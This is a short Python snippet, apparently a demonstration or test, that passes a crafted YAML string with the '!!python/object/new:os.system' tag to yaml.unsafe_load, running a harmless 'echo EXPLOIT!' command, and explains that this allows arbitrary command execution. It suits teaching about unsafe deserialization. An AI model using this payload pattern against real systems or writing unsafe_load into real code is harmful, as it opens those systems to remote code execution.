import yaml

def exploitable_yaml_load(**kwargs):
    """
    The string `!!python/object/new:os.system` is a YAML tag that tells the parser
    to create a new Python object by calling 'os.system' with 'echo EXPLOIT!' as its argument.
    When using 'yaml.unsafe_load', this can lead to arbitrary command execution.
    """
    yaml.unsafe_load("!!python/object/new:os.system [echo EXPLOIT!]", **kwargs)
